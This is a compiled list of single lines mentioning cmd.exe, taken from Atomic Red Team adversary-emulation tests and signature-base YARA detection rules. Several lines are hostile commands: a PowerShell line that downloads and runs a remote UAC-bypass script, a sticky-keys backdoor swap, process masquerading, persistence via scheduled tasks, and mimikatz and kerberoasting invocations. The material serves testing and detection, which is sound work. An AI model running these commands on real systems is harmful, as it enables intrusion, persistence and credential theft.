[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036/T1036.md) | del %ALLUSERSPROFILE%\cmd.exe >nul 2>&1 | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md) | Copies cmd.exe, renames it, and launches it to masquerade as an instance of lsass.exe. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md) | copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md) | cmd.exe /c %APPDATA%\notepad.exe /B | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md) | cmd.exe /c %APPDATA%\svchost.exe /B | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md) | cmd.exe /K %APPDATA%\taskhostw.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md) | This works by copying cmd.exe to a file, naming it lsm.exe, then copying a file to the C:\ folder. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md) | Upon successful execution, cmd.exe will be renamed as lsm.exe and executed from non-standard path. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.003/T1036.003.md) | copy C:\Windows\System32\cmd.exe C:\lsm.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1049.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1049/T1049.md) | Upon successful execution, cmd.exe will execute `netstat`, `net use` and `net sessions`. Results will output via stdout. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1049.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1049/T1049.md) | Upon successful execution, cmd.exe will execute sharpview.exe <method>. Results will output via stdout. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1053.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.002/T1053.002.md) | Executes cmd.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1053.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.002/T1053.002.md) | Upon successful execution, cmd.exe will spawn at.exe and create a scheduled task that will spawn cmd at a specific time. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1053.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md) | schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1053.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md) | schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1053.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md) | Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1053.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md) | \| task_command \| What you want to execute \| String \| C:&#92;windows&#92;system32&#92;cmd.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1053.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md) | Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1053.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md) | Upon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1055.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055.004/T1055.004.md) | Upon successful execution, cmd.exe will execute T1055.exe, which exercises 5 techniques. Output will be via stdout. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1055.012.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055.012/T1055.012.md) | \| hollow_binary_path \| Path of the binary to hollow (executable that will run inside the sponsor) \| String \| C:&#92;Windows&#92;System32&#92;cmd.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1057.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1057/T1057.md) | Upon successful execution, cmd.exe will execute tasklist.exe to list processes. Output will be via stdout. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1059.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md) | Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1059.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md) | C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1070.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.004/T1070.004.md) | Delete a single file from the temporary directory using cmd.exe. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1070.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.004/T1070.004.md) | Recursively delete a folder in the temporary directory using cmd.exe. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1083.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1083/T1083.md) | - [Atomic Test #1 - File and Directory Discovery (cmd.exe)](#atomic-test-1---file-and-directory-discovery-cmdexe) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1083.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1083/T1083.md) | ## Atomic Test #1 - File and Directory Discovery (cmd.exe) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | Upon successful execution, this will rename cmd.exe as svchost.exe and move it to `c:\`, then execute svchost.exe with output to a txt file. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | copy C:\Windows\System32\cmd.exe C:\svchost.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | cmd.exe /c "del $file_to_be_removed" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1110.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.002/T1110.002.md) | Start-Process cmd.exe -Args  "/c %temp%\7z\7z.exe x %temp%\hashcat6.7z -aoa -o%temp%\hashcat-unzip" -Wait | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1134.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.002/T1134.002.md) | This Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1134.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.002/T1134.002.md) | .\T1134.002\src\GetToken.ps1; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe") | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1134.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.002/T1134.002.md) | taskkill /im cmd.exe /f | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1204.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.md) | $macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1204.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.md) | $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1204.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.md) | $macrocode = "   Open `"#{bat_path}`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c $bat_path `", vbNormalFocus)`n" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1207.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1207/T1207.md) | $dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c #{psexec_path} /accepteula -d -s #{mimikatz_path} $mimikatzParam" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md) | set comspec=%windir%\System32\cmd.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.md) | Adversaries may invoke cmd.exe (or other malicious commands) by embedding them in the RunPreSetupCommandsSection of an INF file | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1543.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md) | Upon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1546.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.001/T1546.001.md) | Change Default File Association From cmd.exe of hta to notepad. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1546.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.001/T1546.001.md) | Upon successful execution, cmd.exe will change the file association of .hta to notepad.exe. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1546.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.002/T1546.002.md) | \| input_binary \| Executable binary to use in place of screensaver for persistence \| Path \| C:&#92;Windows&#92;System32&#92;cmd.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1546.008.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.md) | For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with "cmd.exe" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1546.008.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.md) | Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1546.008.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.md) | Upon successful execution, powershell will modify the registry and swap osk.exe with cmd.exe. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1546.008.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.md) | \| attached_process \| Full path to process to attach to target in #{parent_list}. Default: cmd.exe \| Path \| C:&#92;windows&#92;system32&#92;cmd.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1546.008.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.md) | Replace sticky keys binary (sethc.exe) with cmd.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1546.008.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.md) | copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1546.012.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.012/T1546.012.md) | Similar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures "cmd.exe," or another program that provides backdoor access, as a "debugger" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the "debugger" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1546.012.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.012/T1546.012.md) | \| payload_binary \| Binary To Execute \| Path \| C:&#92;Windows&#92;System32&#92;cmd.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1547.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md) | Upon successful execution, cmd.exe will modify the registry by adding \"Atomic Red Team\" to the Run key. Output will be via stdout. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1547.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md) | Upon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1547.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.004/T1547.004.md) | Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1547.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.004/T1547.004.md) | \| binary_to_execute \| Path of binary to execute \| Path \| C:&#92;Windows&#92;System32&#92;cmd.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1547.009.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.009/T1547.009.md) | $ShortCut.TargetPath="cmd.exe" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1548.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md) | \| executable_binary \| Binary to execute with UAC Bypass \| Path \| C:&#92;Windows&#92;System32&#92;cmd.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1548.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md) | cmd.exe /c eventvwr.msc | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1548.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md) | Upon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1548.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md) | \| command.to.execute \| Command to execute \| String \| cmd.exe /c notepad.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1558.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.003/T1558.003.md) | cmd.exe /c "#{local_folder}\#{local_executable}" kerberoast #{flags} /outfile:"#{local_folder}\#{out_file}" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1558.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.004/T1558.004.md) | cmd.exe /c "#{local_folder}\#{local_executable}" asreproast /outfile:"#{local_folder}\#{out_file}" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1559.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1559.002/T1559.002.md) | {DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"  } | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1559.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1559.002/T1559.002.md) | 9. DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1562.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md) | if ((cmd.exe /c "where.exe Sysmon.exe 2> nul \| findstr Sysmon 2> nul") -or (Test-Path $env:Temp\Sysmon\Sysmon.exe)) { exit 0 } else { exit 1 } | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1562.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md) | if(cmd.exe /c "where.exe Sysmon.exe 2> nul \| findstr Sysmon 2> nul") { C:\Windows\Sysmon.exe -accepteula -i } else | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1563.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1563.002/T1563.002.md) | sc.exe create sesshijack binpath= "cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1564.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md) | \| payload_path \| Path of file to hide in ADS \| Path \| c:&#92;windows&#92;system32&#92;cmd.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1569.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1569.002/T1569.002.md) | Upon successful execution, cmd.exe creates a new service using sc.exe that will start powershell.exe to create a new file `art-marker.txt` | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1574.011.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.011/T1574.011.md) | \| malicious_service_path \| malicious service path \| String \| %windir%&#92;system32&#92;cmd.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_apt15.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_apt15.yar) | $ = "Cmd.Exe" wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_apt29_nobelium_may21.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_apt29_nobelium_may21.yar) | $s2 = "cmd.exe /c start BOOM.exe" ascii wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_apt34.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_apt34.yar) | $x1 = "WshShell.run \"cmd.exe /C C:\\ProgramData\\" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_apt34.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_apt34.yar) | $x3 = "cmd.exe /C certutil -f  -decode C:\\ProgramData\\" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_apt3_bemstour.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_apt3_bemstour.yar) | $cmdline_3 = "cmd.exe /c net user test test /add && cmd.exe /c net localgroup administrators test /add" ascii wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_blackenergy.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_blackenergy.yar) | $s0 = "system32\\cmd.exe" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_casper.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_casper.yar) | $a0 = "cmd.exe /C FOR /L %%i IN (1,1,%d) DO IF EXIST" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_cn_pp_zerot.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_cn_pp_zerot.yar) | $x1 = "%s\\cmd.exe /c %s\\Zlh.exe" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_codoso.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_codoso.yar) | $s0 = "cmd.exe /c ping 127.0.0.1 && ping 127.0.0.1 && sc start %s && ping 127.0.0.1 && sc start %s" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
